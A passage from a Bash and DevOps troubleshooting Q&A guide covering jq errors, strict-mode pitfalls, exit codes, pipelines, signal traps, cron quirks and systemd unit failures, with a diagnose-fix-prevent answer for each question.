[[ $old =~ ^[0-9]{8}T[0-9]{6}Z$ ]] || die "invalid release name: $old"
ssh web1 "rm -rf -- /srv/app/releases/$(printf '%q' "$old")"
```
Or pass it as an argument to a remote script: `ssh web1 bash -s -- "$old" < cleanup.sh` (still validate).

**Prevent →** Treat every remote command string as code; validate inputs and quote with `%q`.

</details>

### Q139. `jq -r '.items[].metadata.name'` fails with `jq: error (at <stdin>:1): Cannot iterate over null (null)` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `.items` does not exist or is `null` in this input: the API returned an error object, a single object instead of a list, or the field name is different (`.Items`, `.data`).

**Diagnose →**
```bash
cmd | jq 'keys'          # what top-level keys exist?
cmd | jq '.items | type'
```

**Fix →** Fix the path, or handle absence explicitly: `jq -r '.items[]?.metadata.name'` or `(.items // [])[]`. If an error object came back, check the command's exit status before parsing.

**Prevent →** Check the producer's exit code, then parse; use `jq -e` when a missing value should fail the script.

</details>

### Q140. `curl -s "$API/status" | jq .state` fails with `jq: parse error: Invalid numeric literal at line 1, column 10` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The response is not JSON: an HTML error page from a load balancer (`<html>502 Bad Gateway`), a plain-text error, or a redirect page. `curl -s` hides HTTP errors and still prints the body.

**Diagnose →**
```bash
curl -sS -o /tmp/body -w '%{http_code} %{content_type}\n' "$API/status"; head -c 300 /tmp/body
```

**Fix →** Fail on HTTP errors and check the status before parsing:
```bash
body=$(curl -fsS --max-time 10 "$API/status") || die "status API request failed"
state=$(jq -er '.state' <<<"$body") || die "unexpected response: ${body:0:200}"
```

**Prevent →** Always use `curl -f` (or check `%{http_code}`) in scripts, plus `--max-time`.

</details>

## Troubleshooting: strict mode, exit codes, pipelines and traps

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q141. A script with `set -e` stops silently right after `((retries++))` on its first pass. No error message, exit code 1. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `(( expr ))` returns status 1 when the expression evaluates to 0. Post-increment returns the **old** value, so `((retries++))` with `retries=0` evaluates to 0, returns 1, and `set -e` exits. The same happens with `((count--))` reaching zero or `(( x = 0 ))`.

**Diagnose →**
```bash
bash -c 'set -e; n=0; ((n++)); echo "never printed"'; echo "rc=$?"   # rc=1
bash -x ./script.sh 2>&1 | tail -5                                  # last traced line is the (( ))
```

**Fix →** Use an assignment form, which always succeeds:
```bash
retries=$((retries + 1))     # or: (( ++retries ))  (pre-increment, returns the new value)
(( retries++ )) || true      # if you must keep the old form
```

**Prevent →** Ban bare `((x++))` in style guides; use `x=$((x + 1))`. A bats test that runs the loop's first iteration catches it.

</details>

### Q142. `notify.sh: line 9: SLACK_WEBHOOK: unbound variable` — but the webhook is meant to be optional. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `set -u` treats any reference to an unset variable as fatal, including in `[[ -n $SLACK_WEBHOOK ]]`. The variable is optional, so it is legitimately unset on hosts without Slack.

**Diagnose →**
```bash
sed -n '9p' notify.sh
env | grep -c SLACK_WEBHOOK      # 0 = not set in this environment
```

**Fix →** Expand with an explicit default wherever the variable is optional, and fail with a clear message where it is required:
```bash
SLACK_WEBHOOK=${SLACK_WEBHOOK:-}                  # optional: default to empty, once, at the top
: "${S3_BUCKET:?S3_BUCKET must be set in /etc/opskit/opskit.conf}"   # required: abort with a message
if [[ -n $SLACK_WEBHOOK ]]; then send_slack "$msg"; fi
```

**Prevent →** Declare every config variable at the top with `:-` or `:?`, so the contract is visible in one place. Do not "fix" it by removing `set -u`; it catches real typos like `$S3_BUKET`.

</details>

### Q143. On a CentOS 7 / Amazon Linux 2 host, `deploy.sh "${extra_args[@]}"` fails with `extra_args[@]: unbound variable`. It works on your laptop. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Before Bash 4.4, `set -u` treated expanding an **empty** array (`"${arr[@]}"`) as an unbound-variable error. CentOS 7 ships Bash 4.2, Amazon Linux 2 ships 4.2; your laptop has 5.x, where empty arrays are fine.

**Diagnose →**
```bash
bash --version | head -1
bash -c 'set -u; a=(); echo "${a[@]}"; echo ok'   # fails on 4.2/4.3, prints ok on 4.4+
```

**Fix →** Use the `${arr[@]+...}` idiom, which expands to nothing when the array is empty and works on every version:
```bash
deploy.sh ${extra_args[@]+"${extra_args[@]}"}
```

**Prevent →** Know the oldest Bash you support and run CI in that image (for example `amazonlinux:2`). Document the minimum version at the top of the script and check `BASH_VERSINFO` if it matters.

</details>

### Q144. `local release=$(curl -fsS "$API/latest")` fails with a 503, yet the function happily continues and deploys an empty release name. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `local` is a command, and its exit status (0) replaces the status of the command substitution. The same masking happens with `export VAR=$(cmd)`, `declare` and `readonly`. ShellCheck reports it as SC2155.

**Diagnose →**
```bash
bash -c 'set -e; f(){ local x=$(false); echo "still running, x=[$x]"; }; f'
shellcheck deploy.sh | grep SC2155
```

**Fix →** Declare and assign separately, and validate the value:
```bash
local release
release=$(curl -fsS --max-time 10 "$API/latest")
[[ $release =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || die "bad release from API: '$release'"
```

**Prevent →** Keep ShellCheck at zero findings in CI; SC2155 alone catches this whole class of bug.

</details>

### Q145. A check `procs=$(ps aux | grep -v grep | grep -c '[n]ginx: worker')` kills the script under `set -euo pipefail` whenever nginx is down, before the alert code runs. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `grep` exits 1 when it matches nothing, and `grep -c` exits 1 even while printing `0`. With `pipefail` the pipeline fails, the assignment inherits that status, and `set -e` exits, so the "nginx is down" branch is never reached. "No match" is not an error here, but strict mode cannot know that.

**Diagnose →**
```bash
echo foo | grep -c bar; echo "rc=$?"      # prints 0, rc=1
```

**Fix →** Tell the shell that "no match" is an expected outcome, or use a tool that does not treat it as failure:
```bash
procs=$(pgrep -c -f 'nginx: worker' || true)        # pgrep exits 1 on no match too
procs=$(ps -eo args | awk '/^nginx: worker/ {n++} END {print n+0}')   # awk exits 0 either way
if (( procs == 0 )); then alert CRITICAL "nginx has no workers"; fi
```
Avoid `|| true` on a whole long pipeline, because it also hides real failures such as `ps` itself breaking.

**Prevent →** Treat `grep`, `diff`, `cmp` and `pgrep` as "exit 1 is a valid answer" tools and handle that status explicitly.

</details>

### Q146. A script that does `first=$(sort -u huge.txt | head -n 1)` exits with status 141 under `pipefail`, but only on large inputs. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** 141 is 128 + 13, `SIGPIPE`. `head` exits after one line and closes the pipe; the writer is still producing output, gets `SIGPIPE` on its next write and dies. With small inputs the writer finishes before `head` exits, so there is no error, which makes it intermittent. `pipefail` turns the writer's 141 into the pipeline's status.

**Diagnose →**
```bash
set -o pipefail; yes | head -n 1; echo "rc=$? stages=${PIPESTATUS[*]}"   # rc=141 stages=141 0
```

**Fix →** Avoid early-exit readers on a writer whose status you care about, or accept 141 explicitly:
```bash
first=$(sort -u huge.txt | sed -n '1p')                   # reads everything, no SIGPIPE
sort -u huge.txt > "$tmp"; first=$(head -n 1 "$tmp")      # no pipe at all
# or tolerate exactly 141:
first=$(sort -u huge.txt | head -n 1) || [[ $? -eq 141 ]]
```

**Prevent →** Know that `head`, `grep -q`, `grep -m1` and `awk ... exit` close pipes early. Under `pipefail`, either let the reader consume everything or handle 141.

</details>

### Q147. You added `trap 'echo "failed at line $LINENO" >&2' ERR`, but when a command inside a function fails, nothing is printed and the script just exits. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The `ERR` trap is not inherited by functions, command substitutions or subshells unless `set -E` (`errtrace`) is on. `set -e` still exits, so you get the exit without the message.

**Diagnose →**
```bash
bash -c 'set -e; trap "echo ERR \$LINENO" ERR; f(){ false; }; f'    # prints nothing
bash -c 'set -Ee; trap "echo ERR \$LINENO" ERR; f(){ false; }; f'   # prints ERR 1
```

**Fix →** Use the full strict header and a trap function that reports useful context:
```bash
set -Eeuo pipefail
on_err() { echo "ERROR: '${BASH_COMMAND}' exited $1 at ${BASH_SOURCE[1]}:${BASH_LINENO[0]}" >&2; }
trap 'on_err $?' ERR
```

**Prevent →** Make `set -Eeuo pipefail` the template header. Note that without `set -e`, the trap fires once for the failing command and again for the function call that returns non-zero, so keep the trap idempotent or log only.

</details>

### Q148. `backup` calls `upload_to_s3`, which fails, yet `if backup; then echo "Backup OK"; fi` prints "Backup OK". `set -e` is on. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `set -e` is **suspended** for everything executed as part of an `if`/`while` condition, the left side of `&&`/`||`, or after `!`, including the entire body of any function called there. Inside `backup`, the failed `upload_to_s3` is ignored, the next command succeeds, and the function returns 0.

**Diagnose →**
```bash
bash -c 'set -e; f(){ false; echo "kept going"; }; if f; then echo "reported OK"; fi'
```

**Fix →** Make functions return failure explicitly instead of relying on `set -e` inside them:
```bash
backup() {
  create_archive        || return 1
  upload_to_s3 "$arch"  || return 1
  verify_upload "$arch" || return 1
}
if backup; then log INFO "Backup OK"; else alert CRITICAL "backup failed"; fi
```
Or call it unconditionally (`backup`) and handle the outcome in the `ERR`/`EXIT` trap.

**Prevent →** Treat `set -e` as a safety net, not as error handling. Any function used in a condition must check its own steps.

</details>

### Q149. The backup failed and printed errors, but cron and the monitoring wrapper both recorded exit code 0. The last line of the script is `main "$@" 2>&1 | tee -a "$LOG"`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A pipeline's status is the status of its **last** command, `tee`, which succeeded. `pipefail` was not set (or was set inside `main`, which runs in the pipeline's subshell and does not affect the outer shell).

**Diagnose →**
```bash
bash -c 'f(){ return 3; }; f | tee /dev/null; echo "rc=$? stages=${PIPESTATUS[*]}"'   # rc=0 stages=3 0
```

**Fix →** Redirect the whole script's output once, near the top, instead of piping `main`:
```bash
set -Eeuo pipefail
exec > >(tee -a "$LOG") 2>&1      # or simply: exec >>"$LOG" 2>&1 under systemd/cron
main "$@"
```
Alternatively set `pipefail` in the outer shell or `exit "${PIPESTATUS[0]}"` after the pipeline.

**Prevent →** Test the failure path: a bats test that forces `aws` to fail and asserts `status -ne 0`.

</details>

### Q150. Temp directories pile up in `/tmp` even though the script has `trap "rm -rf $workdir" EXIT`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Double quotes expand `$workdir` when the trap is **set**, not when it fires. The trap was set before `workdir=$(mktemp -d)`, so it holds `rm -rf ` with an empty path and deletes nothing. (If `workdir` had an old value, it would delete the wrong thing.)

**Diagnose →**
```bash
trap -p EXIT        # shows: trap -- 'rm -rf ' EXIT
```

**Fix →** Single-quote the trap so the variable expands at exit time, and guard against an empty value:
```bash
workdir=$(mktemp -d)
trap 'rm -rf -- "${workdir:?}"' EXIT
```

**Prevent →** Always single-quote trap bodies, or call a `cleanup` function. ShellCheck SC2064 flags double-quoted traps.

</details>

### Q151. Pressing Ctrl+C during `while read -r host; do ssh -n "$host" uptime; done < hosts.txt` only skips to the next host. You have to press it 40 times. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `SIGINT` goes to the foreground process group. `ssh` handles it and exits with its own status (255) rather than dying from the signal, so Bash concludes the child handled Ctrl+C and the loop simply continues.

**Diagnose →** Check `$?` after the interrupted `ssh` (255 or 130 instead of the shell itself exiting). `trap -p INT` shows no trap is set.

**Fix →** Trap `INT` and `TERM` in the script so it stops itself:
```bash
trap 'echo "interrupted" >&2; exit 130' INT
trap 'echo "terminated" >&2; exit 143' TERM
while read -r host; do
  ssh -n -o ConnectTimeout=5 "$host" uptime || echo "$host: failed ($?)" >&2
done < hosts.txt
```

**Prevent →** Every long-running loop script gets `INT`/`TERM` traps that exit with 128+signal and let the `EXIT` trap clean up.

</details>

### Q152. `docker stop` on your container always takes 10 seconds and ends with `Exited (137)`. The entrypoint is a Bash script that starts the app. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The script is PID 1 and starts the app as a child. Docker sends `SIGTERM` to PID 1; Bash does not forward it to the child, and as PID 1 it has no default `TERM` handler, so nothing happens until Docker sends `SIGKILL` after the grace period (137 = 128 + 9). The app never gets to drain connections.

**Diagnose →**
```bash
docker exec app ps -o pid,ppid,args     # PID 1 is bash, the app is a child
docker inspect -f '{{.State.ExitCode}}' app   # 137
```

**Fix →** Replace the shell with the app once setup is done, so the app becomes PID 1 and receives signals directly:
```bash
#!/usr/bin/env bash
set -Eeuo pipefail
/app/bin/render-config
exec /app/bin/server --port 8080
```
If the script must stay alive (for post-exit work), forward the signal: start the app in the background, `trap 'kill -TERM "$pid"' TERM INT`, then `wait "$pid"`, and `wait` again after the trap. Or run with `docker run --init` (tini) for zombie reaping.

**Prevent →** Use `exec` for the final command in every entrypoint; test with `docker stop -t 30` and check the exit code is 0 or 143, not 137.

</details>

### Q153. A health-check wrapper reports `check failed: unknown exit code 124` for `timeout 20 ./check_db.sh`. What does 124 mean, and what else can `timeout` return? 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** GNU `timeout` returns **124** when the time limit expired and it sent the signal. The check is hanging (DNS, a DB connection with no client timeout, a lock), not failing.

**Diagnose →**
```bash
timeout 20 ./check_db.sh; echo "rc=$?"
timeout -v 20 ./check_db.sh          # -v prints "timeout: sending signal TERM to command ..."
bash -x ./check_db.sh                # see which step hangs
```
Codes to know: 124 timed out, 125 `timeout` itself failed, 126 command not executable, 127 command not found, 137 killed with `-s KILL` (or by `--kill-after`).

**Fix →** Map 124 to a meaningful state and add timeouts inside the check, so it fails fast with a reason:
```bash
timeout --kill-after=5 20 ./check_db.sh; rc=$?
case $rc in
  0) state=OK ;; 124|137) state=CRITICAL; reason="check timed out after 20s" ;; *) state=CRITICAL ;;
esac
```
Inside: `psql "connect_timeout=5 ..."`, `curl --max-time 5`.

**Prevent →** Every external call in a check has its own timeout, and the wrapper has an outer `timeout --kill-after`.

</details>

### Q154. The error log says `ERROR: curl failed with exit code 0`, which is useless. The code is `if ! curl -fsS "$URL" -o "$out"; then log ERROR "curl failed with exit code $?"; fi`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `$?` inside the `then` branch holds the status of the whole condition, `! curl ...`, which is 0 (the negation succeeded). The original curl status is gone.

**Diagnose →**
```bash
bash -c 'if ! false; then echo "rc=$?"; fi'     # rc=0
```

**Fix →** Capture the status without negation:
```bash
if curl -fsS --max-time 10 "$URL" -o "$out"; then
  :
else
  rc=$?
  log ERROR "curl failed with exit code $rc"     # 6 DNS, 7 connect, 22 HTTP >= 400, 28 timeout
fi
# or: curl ... || { rc=$?; log ERROR "curl failed ($rc)"; return "$rc"; }
```

**Prevent →** Save `$?` into a variable on the very next statement, before any `[[ ]]`, `echo` or `!` touches it.

</details>

### Q155. `result=$(compute_checksums; echo done)` returns `done` even when `compute_checksums` fails, despite `set -e`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Command substitutions run in a subshell, and Bash clears `errexit` inside them by default (outside POSIX mode). The failure inside is ignored, the last command (`echo`) succeeds, and the substitution's status is 0.

**Diagnose →**
```bash
bash -c 'set -e; x=$(false; echo ok); echo "x=$x"'                              # x=ok
bash -c 'set -e; shopt -s inherit_errexit; x=$(false; echo ok); echo "x=$x"'    # exits 1
```

**Fix →** Turn on `inherit_errexit` (Bash 4.4+) next to the strict header, and keep one command per substitution:
```bash
set -Eeuo pipefail
shopt -s inherit_errexit
sums=$(compute_checksums)       # status of compute_checksums propagates to the assignment
```

**Prevent →** Avoid multi-command substitutions; if a substitution must do several things, make it a function that returns its own errors explicitly.

</details>

### Q156. A script dies immediately with exit code 1 and no output. The first command is `read -r VERSION < VERSION`. The file contains `1.4.2`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The `VERSION` file has no trailing newline (common when written with `printf` or by an editor/CI tool). `read` still fills the variable but returns 1 because it hit end-of-file before a newline, and `set -e` exits.

**Diagnose →**
```bash
tail -c 4 VERSION | od -c              # no \n at the end
bash -c 'set -e; read -r v < VERSION; echo "got $v"'; echo "rc=$?"
```

**Fix →** Accept "partial last line" as success, or avoid `read` for single values:
```bash
read -r VERSION < VERSION || [[ -n $VERSION ]]
VERSION=$(<VERSION)                       # strips trailing newlines, no read status issue
```

**Prevent →** Write files with a trailing newline (`printf '%s\n'`), and use `$(<file)` for one-value files.

</details>

### Q157. A script launches 8 uploads in the background with `&` and then calls `wait`. Three uploads failed, but the script exits 0. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `wait` with no arguments waits for all children and returns 0, regardless of their exit statuses. `set -e` does not apply to background jobs.

**Diagnose →**
```bash
bash -c 'false & true & wait; echo "rc=$?"'       # rc=0
```

**Fix →** Record each PID and wait for them individually, counting failures:
```bash
pids=()
for f in "${files[@]}"; do
  upload "$f" & pids+=("$!")
done
failed=0
for pid in "${pids[@]}"; do
  wait "$pid" || failed=$((failed + 1))
done
(( failed == 0 )) || die "$failed of ${#pids[@]} uploads failed"
```
For bounded parallelism with proper exit codes, `xargs -0 -P4 -n1 ./upload.sh` returns 123 if any invocation failed.

**Prevent →** Never use a bare `wait` when the outcome matters; `wait -n` (Bash 4.3+) is useful for "fail fast on first error".

</details>

### Q158. A wrapper logs `stages: 0` for a failed `pg_dump | gzip > db.gz`. The code reads `${PIPESTATUS[@]}` on the line after an `if`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `PIPESTATUS` is overwritten by **every** command, including `[[ ]]`, `echo`, and the `if` test itself. By the time it is read, it describes the last simple command, not the pipeline.

**Diagnose →**
```bash
false | true; [[ 1 == 1 ]]; echo "${PIPESTATUS[@]}"   # 0, the [[ ]] result
```

**Fix →** Copy it immediately after the pipeline, in the same statement position:
```bash
pg_dump -Fc "$DB" | gzip -c > "$tmp"
st=("${PIPESTATUS[@]}")
(( st[0] == 0 )) || die "pg_dump failed (${st[0]})"
(( st[1] == 0 )) || die "gzip failed (${st[1]})"
```

**Prevent →** With `pipefail` you usually only need the pipeline's overall status; copy `PIPESTATUS` when you need to report which stage failed.

</details>

### Q159. An `ERR` trap runs `send_alert`, but when the alert itself fails (Slack is down), the script loops, printing the same error repeatedly until it is killed. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Commands run **inside** the trap handler can trigger the trap again when they fail (with `set -E` and functions involved, the handler's own failing `curl` re-enters it). A handler that retries or re-raises can recurse.

**Diagnose →** `bash -x` shows `on_err` being entered from within `on_err`. `trap -p ERR` confirms what is registered.

**Fix →** Disable the trap at the start of the handler and make the alert best-effort:
```bash
on_err() {
  local rc=$? cmd=$BASH_COMMAND line=${BASH_LINENO[0]}
  trap - ERR
  set +e
  log ERROR "'$cmd' failed ($rc) at line $line"
  send_alert CRITICAL "backup failed at line $line" || log WARN "alert delivery failed"
  exit "$rc"
}
trap on_err ERR
```

**Prevent →** Trap handlers must never fail: no strict mode inside, short timeouts on network calls (`curl --max-time 5`), and an explicit `exit` with the original status.

</details>

### Q160. The nightly export was `Killed` (dmesg shows `Out of memory: Killed process 4121 (export.sh)`). The `EXIT` trap never ran, and a half-written `report.csv` was published to the dashboard. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The OOM killer sends `SIGKILL`, which cannot be trapped, so no cleanup runs (exit status 137 if anyone was waiting). The script wrote directly to the final path, so the partial file is visible.

**Diagnose →**
```bash
dmesg -T | grep -i 'killed process'
journalctl -k --since today | grep -i oom
systemctl status opskit-export.service     # "status=9/KILL" / "Failed with result 'oom-kill'"
```

**Fix →** Write to a temp file in the **same filesystem** and rename only on success, because `mv` within a filesystem is atomic:
```bash
tmp=$(mktemp "${out}.XXXXXX")
generate_report > "$tmp"
mv -f -- "$tmp" "$out"
```
Then fix the memory use (stream with `awk` instead of loading everything into an array) and give the job a limit, for example `MemoryMax=1G` in the unit, so it fails predictably.

**Prevent →** Design every script for `kill -9`: atomic renames, idempotent re-runs, stale temp files cleaned on the next start (`find "$dir" -name '*.tmp.*' -mmin +60 -delete`).

</details>

## Troubleshooting: cron and systemd timers

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q161. A new job in `/etc/cron.d/opskit` never runs. Syslog shows `cron[812]: (*system*opskit) ERROR (Missing newline before EOF, this crontab file will be ignored)`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** cron requires every line, including the last, to end with a newline. The file was generated with `printf` without `\n`, or by a config-management template that stripped the final newline, so cron ignores the **whole** file.

**Diagnose →**
```bash
tail -c 1 /etc/cron.d/opskit | od -c        # last byte is not \n
grep -i 'cron.*opskit' /var/log/syslog       # or: journalctl -u cron --since today
```

**Fix →** Append the newline; cron rereads `/etc/cron.d` automatically on its next minute check:
```bash
printf '\n' >> /etc/cron.d/opskit
```
Also confirm the file is owned by root, mode 0644, and not group/world writable, or cron ignores it for security (`WRONG FILE OWNER` / `BAD FILE MODE`).

**Prevent →** Ship cron files through config management with an explicit trailing newline and a validation step, or move the job to a systemd timer.

</details>

### Q162. You copied a line from `crontab -e` into `/etc/cron.d/backup`, and syslog shows `Error: bad username; while reading /etc/cron.d/backup`. Meanwhile a teammate's user crontab mails `/bin/sh: 1: root: not found` every night. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The two crontab formats differ by one field. Files in `/etc/crontab` and `/etc/cron.d/` have a **user** column after the five time fields; user crontabs (`crontab -e`) do not. Your copied line has no user, so cron reads the command path as a username. Your teammate did the reverse, so cron runs `root` as a command.

**Diagnose →**
```bash
cat /etc/cron.d/backup
crontab -l -u alice | grep -n root
```

**Fix →**
```cron
# /etc/cron.d/backup  (system format: user field required)
30 2 * * * opskit /opt/opskit/bin/backup.sh
# crontab -e  (user format: no user field)
30 2 * * * /opt/opskit/bin/backup.sh
```

**Prevent →** Put a header comment with the field layout at the top of every system cron file, and prefer `/etc/cron.d` files from config management over hand-edited user crontabs.

</details>

### Q163. A script works when you run it, but the cron log email says `/opt/opskit/bin/backup.sh: line 22: aws: command not found`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** cron runs jobs with a minimal environment: `PATH=/usr/bin:/bin`, no login profile, no `~/.bashrc`. `aws` lives in `/usr/local/bin` (or `~/.local/bin` for a pip install), which is on your interactive `PATH` but not cron's.

**Diagnose →** Capture cron's real environment once:
```cron
* * * * * env > /tmp/cron-env.txt 2>&1
```
```bash
command -v aws        # where it is in your shell
diff <(sort /tmp/cron-env.txt) <(env | sort)
```

**Fix →** Set `PATH` explicitly at the top of the script (best, because it also fixes systemd and CI), or in the crontab:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
command -v aws >/dev/null || { echo "aws CLI not found" >&2; exit 127; }
```

**Prevent →** Scripts never depend on the caller's environment: set `PATH`, check required commands with `command -v` at start-up, and test with `env -i bash ./script.sh`.

</details>

### Q164. This crontab line never produces a log file, and cron mails `/bin/sh: 1: Syntax error: end of file unexpected (expecting ")")`: `0 2 * * * /opt/backup.sh > /var/log/backup-$(date +%F).log 2>&1` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** In a crontab, an unescaped `%` ends the command; everything after it is sent to the command's stdin. The shell receives `/opt/backup.sh > /var/log/backup-$(date +` and fails to parse it.

**Diagnose →** The error appears only in cron, never in your terminal. `grep -n '%' <(crontab -l)` finds the culprit.

**Fix →** Escape every `%`, or move the logic into the script where `%` is normal:
```cron
0 2 * * * /opt/backup.sh > /var/log/backup-$(date +\%F).log 2>&1
```
Better: let the script choose its own log file (`exec >>"/var/log/opskit/backup-$(date +%F).log" 2>&1`) and keep the crontab line trivial.

**Prevent →** Keep crontab lines to "time + absolute path to a script". Anything clever belongs in the script, where it can be linted and tested.

</details>

### Q165. A cron job fails intermittently, but there are no emails and no logs. Syslog shows `(CRON) info (No MTA installed, discarding output)`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** cron mails a job's stdout/stderr to `MAILTO` (default: the crontab owner). With no mail transfer agent installed, the output, including every error message, is thrown away.

**Diagnose →**
```bash
grep CRON /var/log/syslog | tail      # job start lines plus "discarding output"
command -v sendmail || echo "no MTA"
```

**Fix →** Log explicitly instead of relying on mail:
```cron
MAILTO=""
*/5 * * * * /opt/opskit/bin/health.sh >> /var/log/opskit/health.log 2>&1
```
Or send output to the journal: `... 2>&1 | logger -t opskit-health`. Note that cron now sees `logger`'s exit status, not the script's, so the script must alert on its own failures.

**Prevent →** Each script writes its own logs and sends its own alerts on failure, so cron's mail is irrelevant. systemd timers solve this by capturing output in the journal by default.

</details>

### Q166. A cron job that runs `docker exec -it db pg_dumpall` fails with `the input device is not a TTY`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `-t` asks Docker to allocate a pseudo-terminal and `-i` keeps stdin open. Under cron, systemd or CI there is no terminal, so Docker refuses. The flags were copied from an interactive session.

**Diagnose →** Run it the way cron does: `setsid bash -c 'docker exec -it db true' < /dev/null` reproduces the error; `[[ -t 0 ]] || echo "no tty"`.

**Fix →** Drop `-t` for non-interactive use; keep `-i` only when piping data **into** the container:
```bash
docker exec db pg_dumpall -U postgres | gzip -c > "$tmp"
gunzip -c dump.sql.gz | docker exec -i db psql -U postgres
```
The same applies to `kubectl exec -it`; in scripts use `kubectl exec pod -- cmd`.

**Prevent →** Grep scripts for `-it` before scheduling them, and test unattended runs with stdin from `/dev/null`.

</details>

### Q167. Two schedules misbehave: `*/90 * * * *` runs every hour, not every 90 minutes, and `0 3 1-7 * 1` ("first Monday of the month") runs every Monday and on days 1 to 7. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Steps apply **within** a field's range: `*/90` in the minute field (0–59) matches only minute 0, so it fires hourly. And when both day-of-month and day-of-week are restricted, cron runs when **either** matches (OR, not AND).

**Diagnose →** Read the schedule as cron does, field by field; for timers, `systemd-analyze calendar` prints the next real trigger times.

**Fix →** Express intervals that do not divide an hour in hours or use a timer; do the "first Monday" check in the command:
```cron
# every 90 min: two lines
0 0,3,6,9,12,15,18,21 * * *  /opt/job.sh
30 1,4,7,10,13,16,19,22 * * * /opt/job.sh
# first Monday at 03:00
0 3 1-7 * * [ "$(date +\%u)" = 1 ] && /opt/job.sh
```
With systemd: `OnCalendar=Mon *-*-01..07 03:00:00` (systemd ANDs weekday and date) or `OnUnitActiveSec=90min`.

**Prevent →** Verify schedules before deploying (`systemd-analyze calendar --iterations=5 '...'`), and comment every cron line with its intent in plain English.

</details>

### Q168. A job in root's crontab works, but the same job moved to the `deploy` user's crontab mails `sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The script calls `sudo systemctl reload nginx`, and `deploy` has no passwordless sudo rule for it. Interactively sudo prompted; under cron there is no terminal to prompt on.

**Diagnose →**
```bash
sudo -l -U deploy                        # what deploy may run, and whether NOPASSWD
sudo -u deploy sudo -n systemctl reload nginx; echo $?   # -n = fail instead of prompting
```

**Fix →** Grant exactly the command needed, without a password, and call sudo with `-n` so it fails fast:
```bash
# /etc/sudoers.d/deploy-nginx   (edit with: visudo -f /etc/sudoers.d/deploy-nginx)
deploy ALL=(root) NOPASSWD: /usr/bin/systemctl reload nginx
```
```bash
sudo -n /usr/bin/systemctl reload nginx
```
Never use `-S` with a password stored in the script.

**Prevent →** Scope sudo rules to exact command lines, validate with `visudo -c`, and use `sudo -n` in all unattended scripts.

</details>

### Q169. `systemctl status opskit-health.service` shows `Main process exited, code=exited, status=203/EXEC`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** systemd could not `exec` the `ExecStart=` binary: wrong path, missing execute bit, a bad shebang (CRLF, interpreter not installed), the file on a `noexec` mount, or SELinux denying execution of a file in a home directory.

**Diagnose →**
```bash
journalctl -u opskit-health -n 20 --no-pager     # "Failed at step EXEC spawning /opt/opskit/bin/health.sh: ..."
systemctl cat opskit-health | grep ExecStart
ls -l /opt/opskit/bin/health.sh; head -1 /opt/opskit/bin/health.sh | od -c | head -2
findmnt -no OPTIONS --target /opt/opskit/bin     # look for noexec
ausearch -m avc -ts recent 2>/dev/null | tail     # SELinux denials
```
The text after "spawning ...:" tells you which: `No such file or directory` (path or shebang interpreter), `Permission denied` (mode, noexec or SELinux), `Exec format error` (no shebang).

**Fix →** Use an absolute path, `chmod 0755`, a valid LF shebang, and install scripts under `/usr/local/bin` or `/opt` (with `restorecon -Rv /opt/opskit` on SELinux systems).

**Prevent →** An `install.sh` that sets modes and contexts, plus `systemd-analyze verify opskit-health.service` in CI.

</details>

### Q170. A new service fails instantly with `status=217/USER` and the journal says `Failed to determine user credentials: No such process`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `User=opskit` (or `Group=`) names an account that does not exist on this host. The playbook created the unit before the user, or the user was created on a different host.

**Diagnose →**
```bash
systemctl cat opskit-backup | grep -E '^(User|Group)='
getent passwd opskit || echo "no such user"
```

**Fix →** Create a system account, then restart:
```bash
useradd --system --home-dir /var/lib/opskit --shell /usr/sbin/nologin opskit
systemctl restart opskit-backup.service
```
Or use `DynamicUser=yes` for services that need no persistent identity (combine with `StateDirectory=` for writable state).

**Prevent →** Order user creation before unit installation in config management, or ship a `sysusers.d` file (`u opskit - "opskit service" /var/lib/opskit`) so `systemd-sysusers` creates it.

</details>

